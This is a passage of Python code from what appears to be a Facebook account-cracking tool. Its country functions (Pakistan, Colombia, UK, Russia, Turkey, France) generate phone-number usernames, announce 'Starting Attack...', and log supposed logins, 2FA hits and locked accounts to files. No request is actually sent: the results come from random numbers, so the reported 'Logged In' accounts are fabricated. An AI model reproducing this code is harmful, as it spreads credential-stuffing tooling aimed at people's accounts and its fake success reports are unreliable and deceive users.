                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PAK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Pakistan',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(pak)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def COLOM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Colombia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(colom)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def UK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United Kingdom',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(uk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def RUS():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Russia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(rus)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def TURK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Turkey',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(turk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def FR():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('France',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(fr)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
